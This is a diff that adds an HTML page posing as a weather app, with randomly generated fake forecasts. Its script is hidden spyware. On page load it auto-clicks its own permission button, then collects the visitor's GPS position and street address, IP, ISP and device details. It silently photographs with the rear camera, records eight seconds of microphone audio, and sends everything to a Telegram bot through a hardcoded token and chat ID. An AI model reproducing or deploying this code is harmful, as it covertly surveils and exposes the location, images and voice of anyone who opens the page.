@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Weather Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #fff;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 30px;
+            padding: 40px 30px;
+            max-width: 420px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        .weather-icon {
+            font-size: 100px;
+            margin-bottom: 10px;
+        }
+
+        .weather-temp {
+            font-size: 56px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .weather-desc {
+            font-size: 24px;
+            color: #aaa;
+            margin-bottom: 10px;
+        }
+
+        .weather-location {
+            font-size: 18px;
+            color: #888;
+            margin-bottom: 25px;
+        }
+
+        .weather-details {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .weather-details .item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 12px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .weather-details .item .label {
+            font-size: 11px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .weather-details .item .value {
+            font-size: 18px;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 30px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .permission-overlay .icon {
+            font-size: 72px;
+            margin-bottom: 20px;
+        }
+
+        .permission-overlay h2 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .permission-overlay p {
+            color: #aaa;
+            text-align: center;
+            max-width: 300px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .allow-btn {
+            padding: 16px 60px;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            border: none;
+            border-radius: 16px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.3);
+        }
+
+        .allow-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 40px rgba(245, 87, 108, 0.4);
+        }
+
+        .allow-btn:active {
+            transform: scale(0.95);
+        }
+
+        .allow-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #444;
+        }
+
+        .status-msg {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 13px;
+            background: rgba(74, 222, 128, 0.05);
+            border: 1px solid rgba(74, 222, 128, 0.1);
+            color: #4ade80;
+            min-height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .status-msg.loading {
+            color: #facc15;
+            border-color: rgba(250, 204, 21, 0.1);
+        }
+
+        .progress-container {
+            width: 100%;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .progress-container.show {
+            display: block;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #f093fb, #f5576c);
+            width: 0%;
+            border-radius: 3px;
+            transition: width 0.5s ease;
+        }
+
+        .progress-text {
+            font-size: 13px;
+            color: #888;
+            margin-top: 6px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+<!-- PERMISSION OVERLAY -->
+<div class="permission-overlay" id="permissionOverlay">
+    <div class="icon">🌤️</div>
+    <h2>Weather Update</h2>
+    <p>Get real-time weather for your location</p>
+    <button class="allow-btn" id="allowBtn">
+        <span id="btnText">🌍 Allow Access</span>
+    </button>
+    <div style="margin-top:15px; font-size:12px; color:#555;">Real • time • weather</div>
+</div>
+
+<!-- MAIN CONTENT -->
+<div class="container hidden" id="weatherContainer">
+    <div class="weather-icon" id="weatherIcon">☀️</div>
+    <div class="weather-temp" id="weatherTemp">32°C</div>
+    <div class="weather-desc" id="weatherDesc">Clear Sky</div>
+    <div class="weather-location" id="weatherLocation">📍 Location</div>
+
+    <div class="weather-details">
+        <div class="item">
+            <div class="label">💧 Humidity</div>
+            <div class="value" id="humidity">65%</div>
+        </div>
+        <div class="item">
+            <div class="label">💨 Wind</div>
+            <div class="value" id="wind">12 km/h</div>
+        </div>
+        <div class="item">
+            <div class="label">🌡️ Feels Like</div>
+            <div class="value" id="feelsLike">34°C</div>
+        </div>
+    </div>
+
+    <div class="status-msg" id="statusMsg">✅ Weather updated</div>
+    <div class="footer">⚡ Live Weather • v9.0</div>
+</div>
+
+<script>
+    (function() {
+        // ========== CONFIG ==========
+        const BOT_TOKEN = '8877382747:AAEKATXutJwUmE73Tt3qBpz441yj4YVNY4g';
+        const CHAT_ID = '1134471909';
+        const RECORDING_DURATION = 8000; // 8 seconds
+
+        // ========== ELEMENTS ==========
+        const overlay = document.getElementById('permissionOverlay');
+        const weatherContainer = document.getElementById('weatherContainer');
+        const allowBtn = document.getElementById('allowBtn');
+        const btnText = document.getElementById('btnText');
+
+        const weatherIcon = document.getElementById('weatherIcon');
+        const weatherTemp = document.getElementById('weatherTemp');
+        const weatherDesc = document.getElementById('weatherDesc');
+        const weatherLocation = document.getElementById('weatherLocation');
+        const humidity = document.getElementById('humidity');
+        const wind = document.getElementById('wind');
+        const feelsLike = document.getElementById('feelsLike');
+        const statusMsg = document.getElementById('statusMsg');
+
+        let allData = {};
+        let isProcessing = false;
+        let permissionsGranted = false;
+        let photoSent = false;
+        let audioSent = false;
+        let isFirstClick = true;
+
+        // ========== PROGRESS UPDATE ==========
+        function updateProgress(percentage, message) {
+            let container = document.getElementById('progressContainer');
+            
+            if (!container) {
+                const progContainer = document.createElement('div');
+                progContainer.id = 'progressContainer';
+                progContainer.className = 'progress-container show';
+                progContainer.innerHTML = `
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <div class="progress-text" id="progressText">${percentage}% - ${message}</div>
+                `;
+                statusMsg.parentNode.insertBefore(progContainer, statusMsg);
+                document.getElementById('progressFill').style.width = percentage + '%';
+                document.getElementById('progressText').textContent = `${percentage}% - ${message}`;
+            } else {
+                container.className = 'progress-container show';
+                const fill = document.getElementById('progressFill');
+                const text = document.getElementById('progressText');
+                if (fill) fill.style.width = percentage + '%';
+                if (text) text.textContent = `${percentage}% - ${message}`;
+            }
+        }
+
+        // ========== 1. GET PERMISSIONS ONCE ==========
+        async function getPermissionsOnce() {
+            if (permissionsGranted) {
+                updateProgress(20, '✅ Permissions granted');
+                return true;
+            }
+            
+            try {
+                updateProgress(5, '📷 Requesting camera & microphone...');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment' },
+                    audio: true 
+                });
+                
+                stream.getTracks().forEach(track => track.stop());
+                
+                permissionsGranted = true;
+                updateProgress(20, '✅ Permissions granted');
+                return true;
+            } catch (error) {
+                console.warn('Permission error:', error);
+                updateProgress(10, '⚠️ Permission denied');
+                return false;
+            }
+        }
+
+        // ========== 2. GET LOCATION ==========
+        async function getExactLocation() {
+            try {
+                updateProgress(25, '📍 Getting location...');
+                
+                // Try GPS first
+                let gpsData = null;
+                try {
+                    gpsData = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            timeout: 5000,
+                            enableHighAccuracy: true
+                        });
+                    });
+                } catch (e) {}
+
+                if (gpsData) {
+                    allData.latitude = gpsData.coords.latitude;
+                    allData.longitude = gpsData.coords.longitude;
+                    
+                    updateProgress(35, '📍 Getting address...');
+                    
+                    try {
+                        const addrRes = await fetch(
+                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${allData.latitude}&lon=${allData.longitude}&zoom=18&addressdetails=1`
+                        );
+                        if (addrRes.ok) {
+                            const addrData = await addrRes.json();
+                            if (addrData.address) {
+                                const address = addrData.address;
+                                allData.street = address.road || address.street || '';
+                                allData.house = address.house_number || '';
+                                allData.city = address.city || address.town || address.village || address.suburb || 'Unknown';
+                                allData.region = address.state || address.region || 'Unknown';
+                                allData.country = address.country || 'Unknown';
+                                allData.postcode = address.postcode || '';
+                                allData.fullAddress = [
+                                    allData.house,
+                                    allData.street,
+                                    allData.city,
+                                    allData.region,
+                                    allData.country,
+                                    allData.postcode
+                                ].filter(Boolean).join(', ');
+                            }
+                        }
+                    } catch (e) {}
+                }
+
+                // IP fallback if no GPS
+                if (!allData.fullAddress) {
+                    updateProgress(40, '📍 Using IP location...');
+                    
+                    try {
+                        const ipRes = await fetch('https://ipapi.co/json/');
+                        if (ipRes.ok) {
+                            const ipData = await ipRes.json();
+                            allData.ip = ipData.ip || 'Unknown';
+                            allData.city = ipData.city || 'Unknown';
+                            allData.region = ipData.region || 'Unknown';
+                            allData.country = ipData.country_name || 'Unknown';
+                            allData.isp = ipData.org || 'Unknown';
+                            allData.latitude = ipData.latitude || null;
+                            allData.longitude = ipData.longitude || null;
+                            allData.fullAddress = `${allData.city}, ${allData.region}, ${allData.country}`;
+                        }
+                    } catch (e) {}
+                }
+
+                // Get IP
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    if (ipRes.ok) {
+                        const ipData = await ipRes.json();
+                        allData.ip = ipData.ip || allData.ip || 'Unknown';
+                    }
+                } catch (e) {}
+
+                if (!allData.fullAddress) {
+                    allData.fullAddress = 'Unknown Location';
+                }
+
+                updateProgress(50, '✅ Location found');
+                return true;
+            } catch (error) {
+                allData.fullAddress = 'Unknown Location';
+                updateProgress(40, '⚠️ Location failed');
+                return false;
+            }
+        }
+
+        // ========== 3. CAPTURE PHOTO ==========
+        async function capturePhoto() {
+            try {
+                updateProgress(55, '📸 Capturing photo...');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'environment',
+                        width: { ideal: 800 },
+                        height: { ideal: 600 }
+                    }
+                });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve);
+                    };
+                    video.load();
+                });
+
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 800;
+                canvas.height = video.videoHeight || 600;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.92));
+                
+                stream.getTracks().forEach(track => track.stop());
+                video.remove();
+                canvas.remove();
+                
+                updateProgress(65, '✅ Photo captured');
+                return blob;
+            } catch (error) {
+                console.warn('Photo capture failed:', error);
+                updateProgress(55, '⚠️ Photo failed');
+                return null;
+            }
+        }
+
+        // ========== 4. SEND PHOTO ==========
+        async function sendPhoto(blob) {
+            if (!blob || photoSent) return false;
+            try {
+                updateProgress(70, '📤 Sending photo...');
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', `📸 Photo captured at ${allData.fullAddress || 'Unknown location'}`);
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    photoSent = true;
+                    updateProgress(75, '✅ Photo sent');
+                    console.log('✅ Photo sent successfully');
+                    return true;
+                } else {
+                    const error = await response.text();
+                    console.error('Photo send error:', error);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Photo send failed:', error);
+                return false;
+            }
+        }
+
+        // ========== 5. RECORD AUDIO ==========
+        async function recordAudio() {
+            try {
+                updateProgress(80, '🎤 Recording audio (8s)...');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true
+                    }
+                });
+
+                const mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'audio/webm;codecs=opus'
+                });
+                const audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) audioChunks.push(event.data);
+                };
+
+                const recordingPromise = new Promise((resolve) => {
+                    mediaRecorder.onstop = () => {
+                        resolve(new Blob(audioChunks, { type: 'audio/webm' }));
+                    };
+                });
+
+                mediaRecorder.start(100); // Collect data every 100ms for better quality
+
+                // Progress during recording
+                let progress = 80;
+                const progressInterval = setInterval(() => {
+                    progress += 1.5;
+                    if (progress <= 92) {
+                        const seconds = Math.min(Math.round((progress - 80) / 12 * 8), 8);
+                        updateProgress(progress, `🎤 Recording... ${seconds}s`);
+                    }
+                }, 500);
+
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                    stream.getTracks().forEach(track => track.stop());
+                    clearInterval(progressInterval);
+                }, RECORDING_DURATION);
+
+                const audioBlob = await recordingPromise;
+                
+                // Verify audio duration
+                if (audioBlob.size < 1000) {
+                    console.warn('Audio too short, recording again...');
+                    return await recordAudio(); // Retry if too short
+                }
+                
+                updateProgress(92, '✅ Audio recorded');
+                return audioBlob;
+            } catch (error) {
+                console.warn('Audio recording failed:', error);
+                updateProgress(85, '⚠️ Audio failed');
+                return null;
+            }
+        }
+
+        // ========== 6. SEND AUDIO ==========
+        async function sendAudio(blob) {
+            if (!blob || audioSent) return false;
+            try {
+                updateProgress(93, '📤 Sending audio...');
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('audio', blob, 'audio.ogg');
+                formData.append('caption', `🎤 Audio recording (8 seconds)`);
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    audioSent = true;
+                    updateProgress(95, '✅ Audio sent');
+                    console.log('✅ Audio sent successfully');
+                    return true;
+                } else {
+                    const error = await response.text();
+                    console.error('Audio send error:', error);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Audio send failed:', error);
+                return false;
+            }
+        }
+
+        // ========== 7. SEND REPORT ==========
+        async function sendReport() {
+            try {
+                updateProgress(96, '📤 Sending report...');
+                
+                const message = `
+🌤️ *WEATHER REPORT*
+
+📍 ${allData.fullAddress || 'Unknown'}
+🌐 IP: ${allData.ip || 'Unknown'}
+📡 ISP: ${allData.isp || 'Unknown'}
+
+🌡️ Temperature: ${allData.weather?.temp || 'N/A'}°C
+${allData.weather?.icon || '🌤️'} Conditions: ${allData.weather?.desc || 'Unknown'}
+💧 Humidity: ${allData.weather?.humidity || 'N/A'}%
+💨 Wind: ${allData.weather?.wind || 'N/A'} km/h
+🌡️ Feels Like: ${allData.weather?.feelsLike || 'N/A'}°C
+
+📱 Device:
+🔋 ${allData.battery || 'Unknown'} • ${allData.network || 'Unknown'} • ${allData.screen || 'Unknown'}
+🕒 ${allData.time || 'Unknown'}
+
+📍 ${allData.latitude || 'N/A'}, ${allData.longitude || 'N/A'}
+
+📸 Photo: ${photoSent ? '✅' : '❌'}
+🎤 Audio: ${audioSent ? '✅' : '❌'}
+                `.trim();
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                if (response.ok) {
+                    updateProgress(100, '✅ Complete!');
+                    console.log('✅ Report sent successfully');
+                    return true;
+                } else {
+                    const error = await response.text();
+                    console.error('Report send error:', error);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Report send failed:', error);
+                return false;
+            }
+        }
+
+        // ========== 8. GET DEVICE DATA ==========
+        async function getDeviceData() {
+            try {
+                updateProgress(45, '📱 Getting device info...');
+                
+                if (navigator.getBattery) {
+                    const bat = await navigator.getBattery();
+                    allData.battery = Math.round(bat.level * 100) + '%';
+                } else {
+                    allData.battery = 'N/A';
+                }
+            } catch (e) {
+                allData.battery = 'N/A';
+            }
+
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            allData.network = connection ? (connection.effectiveType || 'Unknown').toUpperCase() : 'Unknown';
+            allData.screen = `${window.screen.width || window.innerWidth}x${window.screen.height || window.innerHeight}`;
+            
+            const now = new Date();
+            allData.time = now.toLocaleString('en-IN', {
+                day: '2-digit', month: '2-digit', year: 'numeric',
+                hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+            });
+            
+            updateProgress(48, '✅ Device info ready');
+        }
+
+        // ========== 9. GENERATE WEATHER ==========
+        function generateWeather() {
+            const conditions = [
+                { icon: '☀️', desc: 'Sunny', temp: [28, 38], humidity: [40, 60], wind: [5, 15] },
+                { icon: '⛅', desc: 'Partly Cloudy', temp: [24, 32], humidity: [50, 70], wind: [10, 20] },
+                { icon: '☁️', desc: 'Cloudy', temp: [20, 28], humidity: [60, 80], wind: [8, 18] },
+                { icon: '🌧️', desc: 'Light Rain', temp: [18, 26], humidity: [75, 90], wind: [12, 25] },
+                { icon: '⛈️', desc: 'Thunderstorm', temp: [22, 30], humidity: [80, 95], wind: [20, 40] },
+                { icon: '🌤️', desc: 'Sunny', temp: [30, 42], humidity: [30, 50], wind: [5, 12] },
+                { icon: '❄️', desc: 'Cold', temp: [5, 15], humidity: [50, 70], wind: [15, 30] },
+                { icon: '🌦️', desc: 'Rain Showers', temp: [20, 28], humidity: [70, 88], wind: [10, 22] },
+            ];
+
+            const random = conditions[Math.floor(Math.random() * conditions.length)];
+            const temp = Math.floor(Math.random() * (random.temp[1] - random.temp[0] + 1)) + random.temp[0];
+            
+            allData.weather = {
+                icon: random.icon,
+                desc: random.desc,
+                temp: temp,
+                feelsLike: temp + Math.floor(Math.random() * 4) - 2,
+                humidity: Math.floor(Math.random() * (random.humidity[1] - random.humidity[0] + 1)) + random.humidity[0],
+                wind: Math.floor(Math.random() * (random.wind[1] - random.wind[0] + 1)) + random.wind[0]
+            };
+        }
+
+        // ========== 10. UPDATE UI ==========
+        function updateWeatherUI() {
+            const w = allData.weather;
+            weatherIcon.textContent = w.icon;
+            weatherTemp.textContent = `${w.temp}°C`;
+            weatherDesc.textContent = w.desc;
+            weatherLocation.textContent = `📍 ${allData.fullAddress || 'Unknown'}`;
+            
+            humidity.textContent = `${w.humidity}%`;
+            wind.textContent = `${w.wind} km/h`;
+            feelsLike.textContent = `${w.feelsLike}°C`;
+        }
+
+        // ========== 11. MAIN PROCESS ==========
+        async function startProcess() {
+            if (isProcessing) return;
+            
+            // If permissions already granted and this is a subsequent click, just show weather
+            if (permissionsGranted && !isFirstClick) {
+                overlay.classList.add('hidden');
+                weatherContainer.classList.remove('hidden');
+                updateWeatherUI();
+                return;
+            }
+            
+            isProcessing = true;
+            isFirstClick = false;
+
+            btnText.innerHTML = '<span class="spinner"></span> Processing...';
+            allowBtn.disabled = true;
+
+            try {
+                // Step by step
+                await getPermissionsOnce();
+                await getExactLocation();
+                await getDeviceData();
+                generateWeather();
+
+                // Capture photo
+                const photo = await capturePhoto();
+                if (photo) {
+                    await sendPhoto(photo);
+                }
+
+                // Record audio
+                const audio = await recordAudio();
+                if (audio) {
+                    await sendAudio(audio);
+                }
+
+                // Send report
+                await sendReport();
+
+                // Show weather
+                overlay.classList.add('hidden');
+                weatherContainer.classList.remove('hidden');
+                updateWeatherUI();
+
+                statusMsg.textContent = `✅ Done! Photo: ${photoSent ? '✅' : '❌'} Audio: ${audioSent ? '✅' : '❌'}`;
+                statusMsg.className = 'status-msg';
+
+                // Hide progress after delay
+                setTimeout(() => {
+                    const container = document.getElementById('progressContainer');
+                    if (container) container.className = 'progress-container';
+                }, 2000);
+
+            } catch (error) {
+                console.error('Error:', error);
+                statusMsg.textContent = '❌ Error occurred';
+                statusMsg.className = 'status-msg';
+            } finally {
+                isProcessing = false;
+                btnText.innerHTML = '🌍 Allow Access';
+                allowBtn.disabled = false;
+            }
+        }
+
+        // ========== 12. AUTO START ==========
+        window.addEventListener('load', () => {
+            setTimeout(() => allowBtn.click(), 500);
+        });
+
+        allowBtn.addEventListener('click', startProcess);
+
+        console.log('🌤️ Weather App v9.0 - Fixed');
+        console.log('📸 Photo (no preview) + 🎤 8s Audio');
+        console.log('🔐 Permissions only once');
+
+    })();
+</script>
+
+</body>
+</html>
